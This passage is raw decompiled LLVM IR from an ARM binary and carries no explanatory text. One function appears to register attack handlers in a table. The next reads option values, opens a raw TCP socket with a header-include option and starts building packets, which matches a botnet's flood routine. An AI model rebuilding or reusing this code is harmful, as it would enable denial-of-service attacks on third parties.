  %v3_a6b0 = mul nuw nsw i32 %v3_a6a0, 4
  store i32 %v3_a6b0, i32* %r1.global-to-local, align 4
  %v2_a6b4 = load i32, i32* @global_var_1ebc4.57, align 4
  %v2_a6b8 = inttoptr i32 %v2_a69c to i32*
  store i32 ptrtoint (i32* @global_var_c6fc.74 to i32), i32* %v2_a6b8, align 4
  %v3_a6bc = load i32, i32* @r5, align 4
  %v4_a6bc = add i32 %v3_a6bc, 4
  %v5_a6bc = inttoptr i32 %v4_a6bc to i8*
  store i8 3, i8* %v5_a6bc, align 1
  %v0_a6c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_a6c0 = add i32 %v0_a6c0, 4
  store i32 %v1_a6c0, i32* %r1.global-to-local, align 4
  %v5_a6c4 = call i32 @function_1439c(i32 %v2_a6b4, i32 %v1_a6c0, i32 ptrtoint (i32* @global_var_c6fc.74 to i32), i32 3)
  %v2_a6c8 = load i8, i8* bitcast (i8** @global_var_1ebc0.55 to i8*), align 4
  %v3_a6c8 = zext i8 %v2_a6c8 to i32
  store i32 %v3_a6c8, i32* %r3.global-to-local, align 4
  store i32 %v5_a6c4, i32* %ip.global-to-local, align 4
  %v0_a6d0 = load i32, i32* @r5, align 4
  %v5_a6d0 = mul nuw nsw i32 %v3_a6c8, 4
  %v6_a6d0 = add i32 %v5_a6d0, %v5_a6c4
  %v7_a6d0 = inttoptr i32 %v6_a6d0 to i32*
  store i32 %v0_a6d0, i32* %v7_a6d0, align 4
  %v0_a6d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a6d4 = load i32, i32* @r7, align 4
  %v2_a6d4 = add i32 %v1_a6d4, %v0_a6d4
  store i32 %v2_a6d4, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a6e0 = load i32, i32* %ip.global-to-local, align 4
  %v1_a6e0 = load i32, i32* @r6, align 4
  %v2_a6e0 = inttoptr i32 %v1_a6e0 to i32*
  store i32 %v0_a6e0, i32* %v2_a6e0, align 4
  %v0_a6e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_a6e4 = trunc i32 %v0_a6e4 to i8
  %v2_a6e4 = load i32, i32* @r4, align 4
  %v3_a6e4 = inttoptr i32 %v2_a6e4 to i8*
  store i8 %v1_a6e4, i8* %v3_a6e4, align 1
  %v2_a6e8 = call i32 @function_14254(i32 %v1_a6d4, i32 8)
  %v2_a6ec = load i8, i8* bitcast (i8** @global_var_1ebc0.55 to i8*), align 4
  %v3_a6ec = zext i8 %v2_a6ec to i32
  store i32 ptrtoint (i32* @global_var_bf88.76 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a6e8, i32* @r5, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v3_a6fc = mul nuw nsw i32 %v3_a6ec, 4
  store i32 %v3_a6fc, i32* %r1.global-to-local, align 4
  %v2_a700 = load i32, i32* @global_var_1ebc4.57, align 4
  %v2_a704 = inttoptr i32 %v2_a6e8 to i32*
  store i32 ptrtoint (i32* @global_var_bf88.76 to i32), i32* %v2_a704, align 4
  %v3_a708 = load i32, i32* @r5, align 4
  %v4_a708 = add i32 %v3_a708, 4
  %v5_a708 = inttoptr i32 %v4_a708 to i8*
  store i8 4, i8* %v5_a708, align 1
  %v0_a70c = load i32, i32* %r1.global-to-local, align 4
  %v1_a70c = add i32 %v0_a70c, 4
  store i32 %v1_a70c, i32* %r1.global-to-local, align 4
  %v5_a710 = call i32 @function_1439c(i32 %v2_a700, i32 %v1_a70c, i32 ptrtoint (i32* @global_var_bf88.76 to i32), i32 4)
  %v2_a714 = load i8, i8* bitcast (i8** @global_var_1ebc0.55 to i8*), align 4
  %v3_a714 = zext i8 %v2_a714 to i32
  store i32 %v3_a714, i32* %r3.global-to-local, align 4
  store i32 %v5_a710, i32* %ip.global-to-local, align 4
  %v0_a71c = load i32, i32* @r5, align 4
  %v5_a71c = mul nuw nsw i32 %v3_a714, 4
  %v6_a71c = add i32 %v5_a71c, %v5_a710
  %v7_a71c = inttoptr i32 %v6_a71c to i32*
  store i32 %v0_a71c, i32* %v7_a71c, align 4
  %v0_a720 = load i32, i32* %r3.global-to-local, align 4
  %v1_a720 = load i32, i32* @r7, align 4
  %v2_a720 = add i32 %v1_a720, %v0_a720
  store i32 %v2_a720, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a72c = load i32, i32* %ip.global-to-local, align 4
  %v1_a72c = load i32, i32* @r6, align 4
  %v2_a72c = inttoptr i32 %v1_a72c to i32*
  store i32 %v0_a72c, i32* %v2_a72c, align 4
  %v0_a730 = load i32, i32* %r2.global-to-local, align 4
  %v1_a730 = trunc i32 %v0_a730 to i8
  %v2_a730 = load i32, i32* @r4, align 4
  %v3_a730 = inttoptr i32 %v2_a730 to i8*
  store i8 %v1_a730, i8* %v3_a730, align 1
  %v2_a734 = call i32 @function_14254(i32 %v1_a720, i32 8)
  %v2_a738 = load i8, i8* bitcast (i8** @global_var_1ebc0.55 to i8*), align 4
  %v3_a738 = zext i8 %v2_a738 to i32
  store i32 ptrtoint (i32* @global_var_b728.78 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a734, i32* @r5, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v3_a748 = mul nuw nsw i32 %v3_a738, 4
  store i32 %v3_a748, i32* %r1.global-to-local, align 4
  %v2_a74c = load i32, i32* @global_var_1ebc4.57, align 4
  %v2_a750 = inttoptr i32 %v2_a734 to i32*
  store i32 ptrtoint (i32* @global_var_b728.78 to i32), i32* %v2_a750, align 4
  %v3_a754 = load i32, i32* @r5, align 4
  %v4_a754 = add i32 %v3_a754, 4
  %v5_a754 = inttoptr i32 %v4_a754 to i8*
  store i8 5, i8* %v5_a754, align 1
  %v0_a758 = load i32, i32* %r1.global-to-local, align 4
  %v1_a758 = add i32 %v0_a758, 4
  store i32 %v1_a758, i32* %r1.global-to-local, align 4
  %v5_a75c = call i32 @function_1439c(i32 %v2_a74c, i32 %v1_a758, i32 ptrtoint (i32* @global_var_b728.78 to i32), i32 5)
  %v2_a760 = load i8, i8* bitcast (i8** @global_var_1ebc0.55 to i8*), align 4
  %v3_a760 = zext i8 %v2_a760 to i32
  store i32 %v3_a760, i32* %r3.global-to-local, align 4
  store i32 %v5_a75c, i32* %ip.global-to-local, align 4
  %v0_a768 = load i32, i32* @r5, align 4
  %v5_a768 = mul nuw nsw i32 %v3_a760, 4
  %v6_a768 = add i32 %v5_a768, %v5_a75c
  %v7_a768 = inttoptr i32 %v6_a768 to i32*
  store i32 %v0_a768, i32* %v7_a768, align 4
  %v0_a76c = load i32, i32* %r3.global-to-local, align 4
  %v1_a76c = load i32, i32* @r7, align 4
  %v2_a76c = add i32 %v1_a76c, %v0_a76c
  store i32 %v2_a76c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a778 = load i32, i32* %ip.global-to-local, align 4
  %v1_a778 = load i32, i32* @r6, align 4
  %v2_a778 = inttoptr i32 %v1_a778 to i32*
  store i32 %v0_a778, i32* %v2_a778, align 4
  %v0_a77c = load i32, i32* %r2.global-to-local, align 4
  %v1_a77c = trunc i32 %v0_a77c to i8
  %v2_a77c = load i32, i32* @r4, align 4
  %v3_a77c = inttoptr i32 %v2_a77c to i8*
  store i8 %v1_a77c, i8* %v3_a77c, align 1
  %v2_a780 = call i32 @function_14254(i32 %v1_a76c, i32 8)
  %v2_a784 = load i8, i8* bitcast (i8** @global_var_1ebc0.55 to i8*), align 4
  %v3_a784 = zext i8 %v2_a784 to i32
  store i32 ptrtoint (i32* @global_var_b00c.80 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a780, i32* @r5, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v3_a794 = mul nuw nsw i32 %v3_a784, 4
  store i32 %v3_a794, i32* %r1.global-to-local, align 4
  %v2_a798 = load i32, i32* @global_var_1ebc4.57, align 4
  %v2_a79c = inttoptr i32 %v2_a780 to i32*
  store i32 ptrtoint (i32* @global_var_b00c.80 to i32), i32* %v2_a79c, align 4
  %v3_a7a0 = load i32, i32* @r5, align 4
  %v4_a7a0 = add i32 %v3_a7a0, 4
  %v5_a7a0 = inttoptr i32 %v4_a7a0 to i8*
  store i8 6, i8* %v5_a7a0, align 1
  %v0_a7a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_a7a4 = add i32 %v0_a7a4, 4
  store i32 %v1_a7a4, i32* %r1.global-to-local, align 4
  %v5_a7a8 = call i32 @function_1439c(i32 %v2_a798, i32 %v1_a7a4, i32 ptrtoint (i32* @global_var_b00c.80 to i32), i32 6)
  %v2_a7ac = load i8, i8* bitcast (i8** @global_var_1ebc0.55 to i8*), align 4
  %v3_a7ac = zext i8 %v2_a7ac to i32
  store i32 %v3_a7ac, i32* %r3.global-to-local, align 4
  store i32 %v5_a7a8, i32* %ip.global-to-local, align 4
  %v0_a7b4 = load i32, i32* @r5, align 4
  %v5_a7b4 = mul nuw nsw i32 %v3_a7ac, 4
  %v6_a7b4 = add i32 %v5_a7b4, %v5_a7a8
  %v7_a7b4 = inttoptr i32 %v6_a7b4 to i32*
  store i32 %v0_a7b4, i32* %v7_a7b4, align 4
  %v0_a7b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_a7b8 = load i32, i32* @r7, align 4
  %v2_a7b8 = add i32 %v1_a7b8, %v0_a7b8
  store i32 %v2_a7b8, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a7c4 = load i32, i32* %ip.global-to-local, align 4
  %v1_a7c4 = load i32, i32* @r6, align 4
  %v2_a7c4 = inttoptr i32 %v1_a7c4 to i32*
  store i32 %v0_a7c4, i32* %v2_a7c4, align 4
  %v0_a7c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a7c8 = trunc i32 %v0_a7c8 to i8
  %v2_a7c8 = load i32, i32* @r4, align 4
  %v3_a7c8 = inttoptr i32 %v2_a7c8 to i8*
  store i8 %v1_a7c8, i8* %v3_a7c8, align 1
  %v2_a7cc = call i32 @function_14254(i32 %v1_a7b8, i32 8)
  %v2_a7d0 = load i8, i8* bitcast (i8** @global_var_1ebc0.55 to i8*), align 4
  %v3_a7d0 = zext i8 %v2_a7d0 to i32
  store i32 ptrtoint (i32* @global_var_a890.82 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a7cc, i32* @r5, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v3_a7e0 = mul nuw nsw i32 %v3_a7d0, 4
  store i32 %v3_a7e0, i32* %r1.global-to-local, align 4
  %v2_a7e4 = load i32, i32* @global_var_1ebc4.57, align 4
  %v2_a7e8 = inttoptr i32 %v2_a7cc to i32*
  store i32 ptrtoint (i32* @global_var_a890.82 to i32), i32* %v2_a7e8, align 4
  %v3_a7ec = load i32, i32* @r5, align 4
  %v4_a7ec = add i32 %v3_a7ec, 4
  %v5_a7ec = inttoptr i32 %v4_a7ec to i8*
  store i8 7, i8* %v5_a7ec, align 1
  %v0_a7f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_a7f0 = add i32 %v0_a7f0, 4
  store i32 %v1_a7f0, i32* %r1.global-to-local, align 4
  %v5_a7f4 = call i32 @function_1439c(i32 %v2_a7e4, i32 %v1_a7f0, i32 ptrtoint (i32* @global_var_a890.82 to i32), i32 7)
  %v2_a7f8 = load i8, i8* bitcast (i8** @global_var_1ebc0.55 to i8*), align 4
  %v3_a7f8 = zext i8 %v2_a7f8 to i32
  store i32 %v3_a7f8, i32* %r3.global-to-local, align 4
  store i32 %v5_a7f4, i32* %ip.global-to-local, align 4
  %v0_a800 = load i32, i32* @r5, align 4
  %v5_a800 = mul nuw nsw i32 %v3_a7f8, 4
  %v6_a800 = add i32 %v5_a800, %v5_a7f4
  %v7_a800 = inttoptr i32 %v6_a800 to i32*
  store i32 %v0_a800, i32* %v7_a800, align 4
  %v0_a804 = load i32, i32* %r3.global-to-local, align 4
  %v1_a804 = load i32, i32* @r7, align 4
  %v2_a804 = add i32 %v1_a804, %v0_a804
  store i32 %v2_a804, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v1_a810 = trunc i32 %v2_a804 to i8
  %v2_a810 = load i32, i32* @r4, align 4
  %v3_a810 = inttoptr i32 %v2_a810 to i8*
  store i8 %v1_a810, i8* %v3_a810, align 1
  %v0_a814 = load i32, i32* %ip.global-to-local, align 4
  %v1_a814 = load i32, i32* @r6, align 4
  %v2_a814 = inttoptr i32 %v1_a814 to i32*
  store i32 %v0_a814, i32* %v2_a814, align 4
  %v2_a818 = call i32 @function_14254(i32 %v1_a804, i32 8)
  %v2_a81c = load i8, i8* bitcast (i8** @global_var_1ebc0.55 to i8*), align 4
  %v3_a81c = zext i8 %v2_a81c to i32
  store i32 ptrtoint (i32* @global_var_81cc.84 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a818, i32* @r5, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v3_a82c = mul nuw nsw i32 %v3_a81c, 4
  store i32 %v3_a82c, i32* %r1.global-to-local, align 4
  %v2_a830 = load i32, i32* @global_var_1ebc4.57, align 4
  %v2_a834 = inttoptr i32 %v2_a818 to i32*
  store i32 ptrtoint (i32* @global_var_81cc.84 to i32), i32* %v2_a834, align 4
  %v3_a838 = load i32, i32* @r5, align 4
  %v4_a838 = add i32 %v3_a838, 4
  %v5_a838 = inttoptr i32 %v4_a838 to i8*
  store i8 10, i8* %v5_a838, align 1
  %v0_a83c = load i32, i32* %r1.global-to-local, align 4
  %v1_a83c = add i32 %v0_a83c, 4
  store i32 %v1_a83c, i32* %r1.global-to-local, align 4
  %v5_a840 = call i32 @function_1439c(i32 %v2_a830, i32 %v1_a83c, i32 ptrtoint (i32* @global_var_81cc.84 to i32), i32 10)
  %v2_a844 = load i8, i8* bitcast (i8** @global_var_1ebc0.55 to i8*), align 4
  %v3_a844 = zext i8 %v2_a844 to i32
  store i32 %v3_a844, i32* %r3.global-to-local, align 4
  %v1_a848 = load i32, i32* @r6, align 4
  %v2_a848 = inttoptr i32 %v1_a848 to i32*
  store i32 %v5_a840, i32* %v2_a848, align 4
  %v0_a84c = load i32, i32* @r5, align 4
  %v2_a84c = load i32, i32* %r3.global-to-local, align 4
  %v5_a84c = mul i32 %v2_a84c, 4
  %v6_a84c = add i32 %v5_a84c, %v5_a840
  %v7_a84c = inttoptr i32 %v6_a84c to i32*
  store i32 %v0_a84c, i32* %v7_a84c, align 4
  %v0_a850 = load i32, i32* %r3.global-to-local, align 4
  %v1_a850 = load i32, i32* @r7, align 4
  %v2_a850 = add i32 %v1_a850, %v0_a850
  store i32 %v2_a850, i32* %r2.global-to-local, align 4
  %v1_a858 = trunc i32 %v2_a850 to i8
  %v2_a858 = load i32, i32* @r4, align 4
  %v3_a858 = inttoptr i32 %v2_a858 to i8*
  store i8 %v1_a858, i8* %v3_a858, align 1
  %v2_a85c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_a85c, i32* @r4, align 4
  store i32 %v6_a558, i32* @r5, align 4
  store i32 %v9_a558, i32* @r6, align 4
  store i32 %v12_a558, i32* @r7, align 4
  ret i32 %v1_a850

; uselistorder directives
  uselistorder i32 %v1_a850, { 1, 0 }
  uselistorder i32 %v1_a804, { 1, 0 }
  uselistorder i32 %v1_a7b8, { 1, 0 }
  uselistorder i32 %v1_a76c, { 1, 0 }
  uselistorder i32 %v1_a720, { 1, 0 }
  uselistorder i32 %v1_a6d4, { 1, 0 }
  uselistorder i32 %v1_a688, { 1, 0 }
  uselistorder i32 %v1_a63c, { 1, 0 }
  uselistorder i32 %v1_a5f0, { 1, 0 }
  uselistorder i8 7, { 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i32* @global_var_1ebc4.57, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i8* bitcast (i8** @global_var_1ebc0.55 to i8*), { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @function_a890(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a890:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-50 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_a890 = load i32, i32* @r4, align 4
  %v15_a890 = load i32, i32* @r8, align 4
  %v21_a890 = load i32, i32* @sl, align 4
  %v1_a894 = urem i32 %arg1, 256
  store i32 %v1_a894, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %v1_a894, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_a8ac = urem i32 %arg3, 256
  store i32 %v1_a8ac, i32* @r4, align 4
  %v2_a8b0 = call i32 @function_14254(i32 %v1_a894, i32 4)
  %v0_a8b4 = load i32, i32* @r5, align 4
  store i32 %v0_a8b4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a8c4 = load i32, i32* @r4, align 4
  store i32 %v0_a8c4, i32* %r0.global-to-local, align 4
  %v5_a8c8 = inttoptr i32 %v0_a8b4 to i32*
  %v6_a8c8 = call i32 @function_a4e8(i32 %v0_a8c4, i32* %v5_a8c8, i32 2, i32 0)
  %v1_a8d4 = urem i32 %v6_a8c8, 256
  store i32 %v1_a8d4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a8e0 = load i32, i32* @r5, align 4
  store i32 %v0_a8e0, i32* %r1.global-to-local, align 4
  %v0_a8e4 = load i32, i32* @r4, align 4
  store i32 %v0_a8e4, i32* %r0.global-to-local, align 4
  %v5_a8e8 = trunc i32 %v6_a8c8 to i8
  %v6_a8ec = inttoptr i32 %v0_a8e0 to i32*
  %v7_a8ec = call i32 @function_a4e8(i32 %v0_a8e4, i32* %v6_a8ec, i32 3, i32 65535)
  %v0_a8f0 = load i32, i32* @r5, align 4
  store i32 %v0_a8f0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a8ec, i32* @r7, align 4
  %v0_a900 = load i32, i32* @r4, align 4
  store i32 %v0_a900, i32* %r0.global-to-local, align 4
  %v4_a904 = inttoptr i32 %v0_a8f0 to i32*
  %v5_a904 = call i32 @function_a4e8(i32 %v0_a900, i32* %v4_a904, i32 4, i32 64)
  %v1_a90c = urem i32 %v5_a904, 256
  store i32 %v1_a90c, i32* %ip.global-to-local, align 4
  %v0_a910 = load i32, i32* @r5, align 4
  store i32 %v0_a910, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a91c = load i32, i32* @r4, align 4
  store i32 %v0_a91c, i32* %r0.global-to-local, align 4
  %v5_a920 = trunc i32 %v5_a904 to i8
  %v6_a924 = inttoptr i32 %v0_a910 to i32*
  %v7_a924 = call i32 @function_a4e8(i32 %v0_a91c, i32* %v6_a924, i32 5, i32 1)
  %v1_a930 = urem i32 %v7_a924, 256
  store i32 %v1_a930, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a93c = load i32, i32* @r5, align 4
  store i32 %v0_a93c, i32* %r1.global-to-local, align 4
  %v0_a940 = load i32, i32* @r4, align 4
  store i32 %v0_a940, i32* %r0.global-to-local, align 4
  %v5_a948 = inttoptr i32 %v0_a93c to i32*
  %v6_a948 = call i32 @function_a4e8(i32 %v0_a940, i32* %v5_a948, i32 6, i32 65535)
  %v0_a950 = load i32, i32* @r5, align 4
  store i32 %v0_a950, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_a948, i32* @sl, align 4
  %v0_a960 = load i32, i32* @r4, align 4
  store i32 %v0_a960, i32* %r0.global-to-local, align 4
  %v4_a964 = inttoptr i32 %v0_a950 to i32*
  %v5_a964 = call i32 @function_a4e8(i32 %v0_a960, i32* %v4_a964, i32 7, i32 65535)
  %v0_a968 = load i32, i32* @r5, align 4
  store i32 %v0_a968, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_a964, i32* @r8, align 4
  %v0_a978 = load i32, i32* @r4, align 4
  store i32 %v0_a978, i32* %r0.global-to-local, align 4
  %v4_a97c = inttoptr i32 %v0_a968 to i32*
  %v5_a97c = call i32 @function_a4e8(i32 %v0_a978, i32* %v4_a97c, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a98c = load i32, i32* @r5, align 4
  store i32 %v0_a98c, i32* %r1.global-to-local, align 4
  %v0_a990 = load i32, i32* @r4, align 4
  store i32 %v0_a990, i32* %r0.global-to-local, align 4
  %v4_a994 = inttoptr i32 %v0_a98c to i32*
  %v5_a994 = call i32 @function_a4e8(i32 %v0_a990, i32* %v4_a994, i32 1, i32 1)
  %v1_a99c = urem i32 %v5_a994, 256
  store i32 %v1_a99c, i32* %ip.global-to-local, align 4
  %v0_a9a0 = load i32, i32* @r5, align 4
  store i32 %v0_a9a0, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9ac = load i32, i32* @r4, align 4
  store i32 %v0_a9ac, i32* %r0.global-to-local, align 4
  %v5_a9b4 = inttoptr i32 %v0_a9a0 to i32*
  %v6_a9b4 = call i32 @function_a4e8(i32 %v0_a9ac, i32* %v5_a9b4, i32 19, i32 0)
  %v0_a9bc = load i32, i32* @r5, align 4
  store i32 %v0_a9bc, i32* %r1.global-to-local, align 4
  %v2_a9c0 = load i32, i32* @global_var_1ec7c.86, align 4
  store i32 %v2_a9c0, i32* %r3.global-to-local, align 4
  store i32 %v6_a9b4, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_a9cc = load i32, i32* @r4, align 4
  store i32 %v0_a9cc, i32* %r0.global-to-local, align 4
  %v4_a9d0 = inttoptr i32 %v0_a9bc to i32*
  %v5_a9d0 = call i32 @function_a4e8(i32 %v0_a9cc, i32* %v4_a9d0, i32 25, i32 %v2_a9c0)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_a9e4 = call i32 @function_13f50(i32 2, i32 3, i32 6)
  store i32 %v3_a9e4, i32* %r0.global-to-local, align 4
  %v7_a9e8 = icmp eq i32 %v3_a9e4, -1
  store i1 %v7_a9e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a9e8, label %dec_label_pc_aecc, label %dec_label_pc_a9f4

dec_label_pc_a9f4:                                ; preds = %dec_label_pc_a890
  store i32 1, i32* %stack_var_-40, align 4
  %v6_a9fc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_a9fc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_aa10 = call i32 @function_13f20(i32 %v3_a9e4, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v6_aa10, i32* %r0.global-to-local, align 4
  %v7_aa14 = icmp eq i32 %v6_aa10, -1
  store i1 %v7_aa14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa14, label %dec_label_pc_aec4, label %dec_label_pc_aa1c

dec_label_pc_aa1c:                                ; preds = %dec_label_pc_a9f4
  %v0_aa1c = load i32, i32* @sl, align 4
  %v3_aa1c = mul i32 %v0_aa1c, 65536
  store i32 %v3_aa1c, i32* %sl.global-to-local, align 4
  %v0_aa20 = load i32, i32* @r8, align 4
  %v3_aa20 = mul i32 %v0_aa20, 65536
  store i32 %v3_aa20, i32* %r8.global-to-local, align 4
  %v0_aa28 = load i32, i32* @r7, align 4
  %v3_aa28 = mul i32 %v0_aa28, 65536
  %v0_aa2c = load i32, i32* @r6, align 4
  %v1_aa2c = urem i32 %v0_aa2c, 256
  store i32 0, i32* %stack_var_-40, align 4
  %v3_aa34 = urem i32 %v0_aa28, 65536
  store i32 %v3_aa34, i32* %r2.global-to-local, align 4
  %v3_aa38 = urem i32 %v0_aa1c, 65536
  store i32 %v3_aa38, i32* %r3.global-to-local, align 4
  %v3_aa3c = urem i32 %v0_aa20, 65536
  store i32 %v3_aa3c, i32* %r1.global-to-local, align 4
  %v0_aa40 = load i32, i32* @fp, align 4
  %v2_aa40 = icmp eq i32 %v0_aa40, 0
  store i1 %v2_aa40, i1* %cpsr_z.global-to-local, align 1
  %tmp88 = icmp slt i32 %v0_aa40, 1
  br i1 %tmp88, label %dec_label_pc_afec, label %dec_label_pc_aa60

dec_label_pc_aa60:                                ; preds = %dec_label_pc_aa1c
  %v3_aa64 = mul i32 %v5_a97c, 65536
  %v0_aa28.not = or i32 %v0_aa28, -65536
  %v1_aa6c = xor i32 %v0_aa28.not, 65535
  %v1_aa74 = add i32 %v3_aa64, 4325376
  %v1_aa78 = urem i32 %v0_aa1c, 256
  %v3_aa80 = udiv i32 %v1_aa74, 256
  %v1_aa84 = add i32 %v3_aa64, 524288
  %v1_aa8c = add i32 %v3_aa64, 1835008
  %v1_aa90 = urem i32 %v0_aa20, 256
  %v1_aa94 = and i32 %v3_aa80, 65280
  store i32 %v1_aa94, i32* %r0.global-to-local, align 4
  %v3_aa9c = udiv i32 %v1_aa8c, 256
  %tmp89 = mul nsw i32 %v1_aa6c, 256
  %v1_aab4 = and i32 %v3_aa9c, 65280
  store i32 %v1_aab4, i32* %ip.global-to-local, align 4
  %v1_aab8 = and i32 %tmp89, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  store i32 %v1_aab8, i32* @lr, align 4
  %tmp91 = udiv i32 %v1_aa6c, 256
  %v4_aaa4 = sdiv i32 %v1_aa74, 16777216
  %v5_aad4 = trunc i32 %tmp91 to i8
  %v3_aae0 = mul nuw nsw i32 %v1_aa78, 256
  %v3_aae8 = ashr i32 %v1_aa74, 31
  %v3_aaec = mul nuw nsw i32 %v1_aa90, 256
  store i32 %v3_aaec, i32* @r5, align 4
  %tmp92 = udiv i32 %v0_aa1c, 256
  %v4_aaf0 = urem i32 %tmp92, 256
  %v5_aaf0 = or i32 %v4_aaf0, %v3_aae0
  store i32 %v5_aaf0, i32* @r7, align 4
  %v3_aaf4 = udiv i32 %v1_aa84, 256
  %tmp93 = udiv i32 %v0_aa20, 256
  %v4_aaf8 = urem i32 %tmp93, 256
  %v5_aaf8 = or i32 %v4_aaf8, %v3_aaec
  store i32 %v5_aaf8, i32* %sl.global-to-local, align 4
  %v5_aafc = trunc i32 %v3_aae8 to i8
  %v3_ab04 = sdiv i32 %v3_aa28, 16777216
  %v7_ab04 = sdiv i32 %v1_aa8c, 16777216
  %v1_ab08 = and i32 %v3_aaf4, 65280
  store i32 %v1_ab08, i32* @r6, align 4
  %v3_ab0c = ashr i32 %v3_aa28, 31
  %v3_ab10 = ashr i32 %v1_aa8c, 31
  %v3_ab14 = udiv i32 %v1_aa6c, 65536
  %v4_ab18 = udiv i32 %v1_aa84, 16777216
  %v5_ab18 = or i32 %v4_ab18, %v1_ab08
  store i32 %v5_ab18, i32* %r8.global-to-local, align 4
  store i32 %v1_aa78, i32* %r1.global-to-local, align 4
  store i32 %v1_aa90, i32* %r2.global-to-local, align 4
  %v3_ab3037 = udiv i32 %v1_ab08, 256
  store i32 %v3_ab3037, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_ab90 = sext i8 %v5_a920 to i32
  %v2_ac90 = icmp eq i32 %v1_aa2c, 0
  %sext16 = mul i32 %v0_aa1c, 16777216
  %v4_aca4 = sdiv i32 %sext16, 16777216
  %sext17 = mul i32 %v1_aa84, 256
  %v4_acb8 = sdiv i32 %sext17, 16777216
  %sext18 = mul i32 %v0_aa20, 16777216
  %v4_acc0 = sdiv i32 %sext18, 16777216
  %v1_acc8 = trunc i32 %v4_acb8 to i8
  br label %dec_label_pc_ab44

dec_label_pc_ab44:                                ; preds = %bb105, %dec_label_pc_aa60
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_ab50 = call i32 @function_14254(i32 1510, i32 4)
  store i32 %v2_ab50, i32* %r0.global-to-local, align 4
  store i32 %v2_a8b0, i32* %r1.global-to-local, align 4
  %v3_ab58 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ab58, i32* %r3.global-to-local, align 4
  %v2_ab5c = load i32, i32* @r4, align 4
